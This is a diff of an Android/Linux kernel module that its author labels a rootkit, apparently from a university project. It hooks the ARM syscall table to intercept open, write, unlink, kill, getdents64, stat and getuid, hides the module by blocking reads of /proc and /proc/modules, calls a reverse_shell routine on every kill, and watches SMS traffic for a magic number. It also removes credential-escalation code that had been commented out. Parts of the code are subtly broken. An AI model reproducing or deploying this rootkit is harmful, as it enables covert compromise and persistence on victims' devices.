@@ -4,17 +4,32 @@
 #include <linux/sched.h> 
 #include <linux/unistd.h> 
 #include <linux/dirent.h>
+#include <linux/fs.h>
+#include <asm/uaccess.h> 
+#include <linux/compat.h>
+
+#include <linux/init.h>
+#include <linux/kprobes.h>
+#include <linux/kallsyms.h>
+#include <linux/ptrace.h>
+#include <linux/mm.h>
+#include <linux/smp.h>
+#include <linux/user.h>
+#include <linux/errno.h>
+#include <linux/cpu.h>
+#include <asm/uaccess.h>
+#include <asm/fcntl.h>
+#include <asm/unistd.h>
+
+#include <linux/stddef.h>
+#include <linux/mm.h>
+#include <linux/smp_lock.h>
 
 #define AUTHOR "Hitesh Dharmdasani <hdharmda@gmu.edu>"
-#define DESCRIPTION "This rookit is developed to intercept the following calls\n \\
-						- SYS_WRITE  \n \\
-						- SYS_CREAT  \n \\
-						- SYS_MKDIR  \n \\
-						- SYS_RMDIR  \n \\
-						- SYS_KILL  \n \\
-						- SYS_OPEN  \n \\ 
-						- SYS_CLOSE  \n \\
-						- sys_getdents64  \n \\
+#define DESCRIPTION 	"This rookit is developed to intercept the following calls\n \\
+						 SYS_WRITE, SYS_READ ,SYS_CREAT ,SYS_MKDIR ,SYS_RMDIR ,SYS_KILL ,SYS_OPEN ,SYS_CLOSE ,\n \\
+						 SYS_GETDENT ,SYS_UNLINK, SYS_KILL \n \\
+						 \\
 						"
 
 MODULE_LICENSE("GPL");
@@ -26,7 +41,9 @@ MODULE_DESCRIPTION(DESCRIPTION);
 #define __NR_KILL 37
 #define __NR_GETDENTS64 217
 
+#define __NR_INIT_MOD 128
 #define __NR_UNLINK 10
+#define __NR_DEL_MOD 129
 #define __NR_EXECVE 11
 #define __NR_MKDIR 39
 #define __NR_RMDIR 40
@@ -35,6 +52,14 @@ MODULE_DESCRIPTION(DESCRIPTION);
 #define __NR_OPEN 5
 #define __NR_CLOSE 6
 #define __NR_CREAT 8
+#define __NR_STAT 18
+
+
+/*must be defined because of syscall macro used below*/
+int errno;
+
+//Definition of my systemcall
+int __NR_myexecve;
 
 static void **sys_call_table;
 int comm_offset=0;
@@ -42,20 +67,14 @@ int cred_offset=0;
 int pid_offset=0;
 int parent_offset=0;
 int next_offset=0;
-int start_chk=0;
 
-struct cred_struct {
-	int usage;
-	int uid;	/* real UID of the task */
-	int gid;	/* real GID of the task */
-	int suid;	/* saved UID of the task */
-	int sgid;	/* saved GID of the task */
-	int euid;	/* effective UID of the task */
-	int egid;	/* effective GID of the task */
-	int fsuid;	/* UID for VFS ops */
-	int fsgid;	/* GID for VFS ops */
-};
+extern int do_execve(const char *,
+                     const char __user * const __user *,
+                     const char __user * const __user *, struct pt_regs *);
 
+asmlinkage long (*orig_stat)(const char __user *filename,struct __old_kernel_stat __user *statbuf);
+asmlinkage long (*orig_init_module)(void __user *umod, unsigned long len,const char __user *uargs);
+asmlinkage long (*orig_delete_module)(const char __user *name_user, unsigned int flags);
 asmlinkage long (*orig_unlink)(const char __user *pathname);
 asmlinkage long (*orig_getdents64)(unsigned int fd,struct linux_dirent64 __user *dirent,unsigned int count);
 asmlinkage ssize_t (*orig_read) (int fd, char *buf, size_t count);
@@ -65,127 +84,84 @@ asmlinkage long (*orig_rmdir)(const char __user *pathname);
 asmlinkage ssize_t (*orig_open) (const char *pathname, int flags);
 asmlinkage ssize_t (*orig_close) (int fd);
 asmlinkage long (*orig_creat) (const char __user *pathname, umode_t mode);
-asmlinkage long (*orig_execve)(const char __user *filename,const char __user *const __user *argv,const char __user *const __user *envp);
+asmlinkage int (*orig_execve)(const char *filename, char *const argv[],char *const envp[], struct pt_regs *regs);
 asmlinkage int (*orig_kill)(pid_t pid, int sig);
 asmlinkage ssize_t (*orig_writev)(int fd,struct iovec *vector,int count);
-//asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+// asmlinkage int (*orig_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 asmlinkage uid_t (*orig_getuid)(void);
 
 
+/* Get the address of sys_call_table as a pointer. All further references are through indexing this pointer */
 void get_sys_call_table(){
-	void *swi_addr=(long *)0xffff0008; // Known address of Software Interrupt handler
-	unsigned long offset=0;
-	unsigned long *vector_swi_addr=0;
 
-	offset=((*(long *)swi_addr)&0xfff)+8; // Hardware interrupt vector is at 8 bytes away from SWI routine
-	vector_swi_addr=*(unsigned long *)(swi_addr+offset);
+	// Interrupt tables are loaded in high memory in android starting at 0xffff0000
 
-	while(vector_swi_addr++){	
-		if(((*(unsigned long *)vector_swi_addr)&0xfffff000)==0xe28f8000){ // Copy the entire sys_call_table from the offset starting the hardware interrupt table
-			offset=((*(unsigned long *)vector_swi_addr)&0xfff)+8;		  // 0xe28f8000 is end of interrupt space. Hence we stop.
-			sys_call_table=(void *)vector_swi_addr+offset;
+	void *swi_table_addr=(long *)0xffff0008; // Known address of Software Interrupt handler
+	unsigned long offset_from_swi_vector_adr=0;
+	unsigned long *swi_vector_adr=0;
+
+	offset_from_swi_vector_adr=((*(long *)swi_table_addr)&0xfff)+8; 
+	swi_vector_adr=*(unsigned long *)(swi_table_addr+offset_from_swi_vector_adr); 
+
+	while(swi_vector_adr++){	
+		if(((*(unsigned long *)swi_vector_adr)&0xfffff000)==0xe28f8000){ // Copy the entire sys_call_table from the offset_from_swi_vector_adr starting the hardware interrupt table
+			offset_from_swi_vector_adr=((*(unsigned long *)swi_vector_adr)&0xfff)+8;		  // 0xe28f8000 is end of interrupt space. Hence we stop.
+			sys_call_table=(void *)swi_vector_adr+offset_from_swi_vector_adr;
 			break;
 		}
 	}
 	return;
 }
 
-void find_offset(){
-	unsigned char *init_task_ptr=(char *)&init_task;
-	int offset=0,i;
-	char *ptr=0;
-
-	/* getting the position of comm offset within task_struct structure */
-	for(i=0;i<0x600;i++){
-		if(init_task_ptr[i]=='s'&&init_task_ptr[i+1]=='w'&&init_task_ptr[i+2]=='a'&&
-		init_task_ptr[i+3]=='p'&&init_task_ptr[i+4]=='p'&&init_task_ptr[i+5]=='e'&&
-		init_task_ptr[i+6]=='r'){
-			comm_offset=i;
-			break;
-		}
-	}
-	/* getting the position of tasks.next offset within task_struct structure */
-	init_task_ptr+=0x50;
-	for(i=0x50;i<0x300;i+=4,init_task_ptr+=4){
-		offset=*(long *)init_task_ptr;
-		if(offset&&offset>0xc0000000){
-			offset-=i;
-			offset+=comm_offset;
-			if(strcmp((char *)offset,"init")){
-				continue;
-			} else {
-				next_offset=i;
-				/* getting the position of parent offset 
-				   within task_struct structure */
-				for(;i<0x300;i+=4,init_task_ptr+=4){
-					offset=*(long *)init_task_ptr;
-					if(offset&&offset>0xc0000000){
-						offset+=comm_offset;
-						if(strcmp((char *)offset,"swapper")){
-							continue;
-						} else {
-							parent_offset=i+4;
-							break;
-						}
-					}
-				}
-				break;
-			}
-		}
-	}
-	/* getting the position of cred offset within task_struct structure */
-	init_task_ptr=(char *)&init_task;
-	init_task_ptr+=comm_offset;
-	for(i=0;i<0x50;i+=4,init_task_ptr-=4){
-		offset=*(long *)init_task_ptr;
-		if(offset&&offset>0xc0000000&&offset<0xd0000000&&offset==*(long *)(init_task_ptr-4)){
-			ptr=(char *)offset;
-			if(*(long *)&ptr[4]==0&&*(long *)&ptr[8]==0&&
-				*(long *)&ptr[12]==0&&*(long *)&ptr[16]==0&&
-				*(long *)&ptr[20]==0&&*(long *)&ptr[24]==0&&
-				*(long *)&ptr[28]==0&&*(long *)&ptr[32]==0){
-				cred_offset=i;
-				break;
-			}
-		}
-	}
-	/* getting the position of pid offset within task_struct structure */
-	pid_offset=parent_offset-0xc;
-	return;
+char* get_contents(const char* path) 
+{
+    // Create variables
+    struct file *f;
+    char buf[128];
+    mm_segment_t fs;
+    int i;
+    // Init the buffer with 0
+    for(i=0;i<128;i++)
+        buf[i] = 0;
+    // To see in /var/log/messages that the module is operating
+    printk(KERN_INFO "My module is loaded\n");
+    // I am using Fedora and for the test I have chosen following file
+    // Obviously it is much smaller than the 128 bytes, but hell with it =)
+    f = filp_open(path, O_RDONLY, 0);
+    if(f == NULL)
+        printk(KERN_ALERT "filp_open error!!.\n");
+    else{
+        // Get current segment descriptor
+        fs = get_fs();
+        // Set segment descriptor associated to kernel space
+        set_fs(get_ds());
+        // Read the file
+        f->f_op->read(f, buf, 128, &f->f_pos);
+        // Restore segment descriptor
+        set_fs(fs);
+        // See what we read from file
+        printk(KERN_INFO "buf:%s\n",buf);
+    }
+    filp_close(f,NULL);
+    return buf;
 }
 
 asmlinkage uid_t our_getuid(void){
-	/*char *ptr=(char *)current;
-	char *comm=ptr+comm_offset;
-	unsigned long cred_ptr=*(int *)(comm-cred_offset);
-	struct cred_struct *cred=(struct cred_struct *)cred_ptr;
-
-	if(start_chk==0){
-		list_del_init( &__this_module.list );
-		start_chk++;
-	}
-	*/
 	printk("Running our_getuid");
 	struct uid_t *tmp;
 	tmp=(*orig_getuid)();
-	if(tmp==0) {
-		printk("Skipping as uid is root");
-		return;
-	}
-	/*if(cred->uid==DEF_GID){ // hidden id 
-		cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
-		cred->gid=DEF_GID; // hidden 
-		cred->egid=0; cred->sgid=0; cred->fsgid=0;
-		return 0;
-	} */
+	// if(tmp==0) {
+	// 	printk("Skipping as uid is root");
+	// 	return;
+	// }
 	return tmp;
 } 
 
 
 asmlinkage ssize_t our_unlink(const char __user *pathname)
 {
-		if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") ) 
-			return -1;
+	if (strstr(pathname,"hello.txt") || strstr(pathname,"/bin") ) 
+		return -1;
         printk (KERN_INFO "SYS_UNLINK: %s\n",pathname);
         return orig_unlink(pathname);
 }
@@ -197,15 +173,27 @@ asmlinkage ssize_t our_read (int fd, char *buf, size_t count)
 }
 asmlinkage ssize_t our_write (int fd, char *buf, size_t count)
 {
-		if(strstr(buf,"sleep"))
-			return -1;
-        printk (KERN_INFO "SYS_WRITE: %s\n",buf);
-        return orig_write(fd,buf,count);
+	if(strstr(buf,"sleep"))
+		return -1;
+   	 printk (KERN_INFO "SYS_WRITE: %s\n",buf);
+    return orig_write(fd,buf,count);
 }
+
+
 asmlinkage ssize_t our_creat (const char __user *pathname, umode_t mode)
 {
         printk (KERN_INFO "SYS_CREAT %s\n",pathname);
         return orig_creat(pathname,mode);
+}
+asmlinkage long our_delete_module(const char __user *name_user, unsigned int flags)
+{
+		printk (KERN_INFO "SYS_DELETE_MODULE: %s",name_user);
+		return orig_delete_module(name_user,flags);
+}
+asmlinkage long our_init_module(void __user *umod, unsigned long len,const char __user *uargs)
+{
+		printk (KERN_INFO "SYS_INIT_MODULE: %s",uargs);
+		return orig_init_module(umod,len,uargs);
 }
 asmlinkage ssize_t our_mkdir (const char __user *pathname, umode_t mode)
 {
@@ -224,7 +212,7 @@ asmlinkage ssize_t our_close(int fd)
         return orig_close(fd);
 }
 
-asmlinkage int our_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
+asmlinkage int our_getdents64 (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){
 	struct linux_dirent64 *td1,*td2;
 	long ret,tmp;
 	unsigned long hpid;
@@ -247,56 +235,6 @@ asmlinkage int our_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsi
 		printk("\nIntercepting %s",td1->d_name);
 	}
 	
-	 /* 
-	td2=(struct linux_dirent64 *)kmalloc(ret,GFP_KERNEL);
-	copy_from_user(td2,dirp,ret);
-
-	td1=td2;
-	tmp=ret;
-
-	while(tmp>0){
-		tmp-=td1->d_reclen;
-		mover=1;
-		process=0;
-		hpid=0;
-
-		hpid=simple_strtoul(td1->d_name,NULL,10);
-		if(hpid!=0){
-			char *init_task_ptr=(char *)&init_task;
-			char *comm=init_task_ptr+comm_offset;
-			unsigned long cred_ptr=*(int *)(comm-cred_offset);
-			struct cred_struct *cred=(struct cred_struct *)cred_ptr;
-			int pid_v=*(int *)(init_task_ptr+pid_offset);
-			char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;
-
-			do{
-				comm=next_ptr+comm_offset;
-				pid_v=*(int *)(next_ptr+pid_offset);
-				cred_ptr=*(int *)(comm-cred_offset);
-				cred=(struct cred_struct *)cred_ptr;
-				if(pid_v==hpid){
-					if(cred->gid==DEF_GID||strstr(comm,DEF_HIDE)){
-						process=1;
-					}
-					break;
-				}
-			} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
-		}
-
-		if(process||strstr(td1->d_name,DEF_HIDE)){
-			ret-=td1->d_reclen;
-			mover=0;
-			if(tmp){
-				memmove(td1,(char *)td1+td1->d_reclen,tmp);
-			}
-		}
-		if(tmp&&mover){
-			td1=(struct linux_dirent64 *)((char *)td1+td1->d_reclen);
-		}
-	}
-	copy_to_user((void *)dirp,(void *)td2,ret);
-	kfree(td2);
-	*/
 	copy_to_user((void *)dirp,(void *)td2,ret);
 	kfree(td2);
 	return ret;
@@ -312,32 +250,9 @@ void reverse_shell()
 	
 asmlinkage int our_kill(pid_t pid, int sig)
 {
-
 	reverse_shell();
 	printk(KERN_INFO "SYS_KILL: %d\n",pid);
-	// char *init_task_ptr=(char *)&init_task;
-	// char *comm=init_task_ptr+comm_offset;
-	// unsigned long cred_ptr=*(int *)(comm-cred_offset);
-	// struct cred_struct *cred=(struct cred_struct *)cred_ptr;
-	// int pid_v=*(int *)(init_task_ptr+pid_offset);
-	// char *next_ptr=(char *)(*(long *)(init_task_ptr+next_offset))-next_offset;
 
-	// if(sig==82){
-	// 	do{
-	// 		comm=next_ptr+comm_offset;
-	// 		pid_v=*(int *)(next_ptr+pid_offset);
-	// 		cred_ptr=*(int *)(comm-cred_offset);
-	// 		cred=(struct cred_struct *)cred_ptr;
-
-	// 		if(pid==pid_v){
-	// 			cred->uid=0; cred->euid=0; cred->suid=0; cred->fsuid=0;
-	// 			cred->gid=DEF_GID; // hidden 
-	// 			cred->egid=0; cred->sgid=0; cred->fsgid=0;
-	// 			break;
-	// 		}
-	// 	} while ((next_ptr=(char *)(*(long *)(next_ptr+next_offset))-next_offset)!=init_task_ptr);
-	// 	return 0;
-	// }
 	return (*orig_kill)(pid,sig); 
 } 
 
@@ -347,7 +262,8 @@ asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
 	char *comm=ptr+comm_offset;
 	int i=0;
 
-	if(strstr(comm,"SmsReceiverServ")){
+	if(strstr(comm,"SmsReceiverServ"))
+	{
 		for(i=0;i<count;i++,vector++){
 			if(strstr((char *)vector->iov_base,"0000")){ /* magic phone number */
 				printk("sms receive\n");
@@ -361,21 +277,61 @@ asmlinkage ssize_t our_writev(int fd,struct iovec *vector,int count)
 
 asmlinkage ssize_t our_open(const char *pathname, int flags) 
 {
+	if(strstr(pathname,"/proc/modules") || strstr(pathname,"hello") || strstr(pathname,"/proc"))
+	{
+		printk(KERN_INFO "Forbidden: Listing modules cancelled.");
+		return -1;
+	}
 	printk(KERN_INFO "SYS_OPEN: %s\n",pathname);
 	return orig_open(pathname,flags);
 }
+ 
+// asmlinkage int sys_execve(const char __user *filenamei,
+//                           const char __user *const __user *argv,
+//                           const char __user *const __user *envp, struct pt_regs *regs)
+// {
+//         int error;
+//         char * filename;
 
-asmlinkage long our_execve(const char __user *filename,const char __user *const __user *argv, const char __user *const __user *envp)
+//         filename = getname(filenamei);
+//         error = PTR_ERR(filename);
+//         if (IS_ERR(filename))
+//                 goto out;
+//         error = do_execve(filename, argv, envp, regs);
+//         putname(filename);
+// out:
+//         return error;
+// }
+asmlinkage long our_stat(const char __user *filename,struct __old_kernel_stat __user *statbuf)
 {
-	printk(KERN_INFO "SYS_EXECVE: %s\n",filename);
-	return orig_execve(filename,argv,envp);
+	printk(KERN_INFO "SYS_STAT: %s\n",filename);
+	return orig_stat(filename,statbuf);
 }
+// asmlinkage int our_execve(const char __user *filenamei,
+//                           const char __user *const __user *argv,
+//                           const char __user *const __user *envp, struct pt_regs *regs)
+// {
+
+
+// 	printk(KERN_INFO "SYS_EXECVE: %s\n",filenamei);
+//         int error;
+//         char * filename;
+
+//         filename = getname(filenamei);
+//         error = PTR_ERR(filename);
+//         if (IS_ERR(filename))
+//                 goto out;
+//         error = do_execve(filename, argv, envp, regs);
+//         putname(filename);
+// out:
+//         return error;
+		
+// }
 
 int init_module(void) 
 {
-	// Need to copy module to kernel boot time module list
 
-	find_offset();
+	// find_offset();
 	get_sys_call_table();
 
 	// Get address of sys_calls and store good copy
@@ -389,9 +345,15 @@ int init_module(void)
 	orig_mkdir = sys_call_table[__NR_MKDIR];
 	orig_getuid = sys_call_table[__NR_GETUID];
 	orig_unlink = sys_call_table[__NR_UNLINK];
-	// orig_execve = sys_call_table[__NR_EXECVE];
-
+	orig_execve = sys_call_table[__NR_EXECVE];
+	orig_stat = sys_call_table[__NR_STAT];
+	// orig_delete_module = sys_call_table[__NR_DEL_MOD];
+	// orig_init_module = sys_call_table[__NR_INIT_MOD];
+	
 	// Overwrite sys_call_table with our versions of sys_calls
+
+	// sys_call_table[__NR_DEL_MOD] = our_delete_module;
+	// sys_call_table[__NR_INIT_MOD] = our_init_module;
 	sys_call_table[__NR_WRITE] = our_write;
 	sys_call_table[__NR_UNLINK] = our_unlink;
 	sys_call_table[__NR_GETDENTS64] = our_getdents64;
@@ -402,7 +364,8 @@ int init_module(void)
 	sys_call_table[__NR_KILL] = our_kill;
 	sys_call_table[__NR_OPEN] = our_open;
 	sys_call_table[__NR_GETUID] = our_getuid;
-	// sys_call_table[__NR_EXECVE] = our_execve;
+	sys_call_table[__NR_STAT] = our_stat;
+	//sys_call_table[__NR_EXECVE] = our_execve;
 	
 	return 0; 
 }
@@ -420,4 +383,7 @@ void cleanup_module(void)
 	sys_call_table[__NR_MKDIR]=orig_mkdir;
 	sys_call_table[__NR_GETUID]=orig_getuid;
 	sys_call_table[__NR_UNLINK]=orig_unlink;
+	// sys_call_table[__NR_INIT_MOD] = orig_init_module;
+	// sys_call_table[__NR_DEL_MOD] = orig_delete_module;
+	// sys_call_table[__NR_EXECVE] = orig_execve;
 }
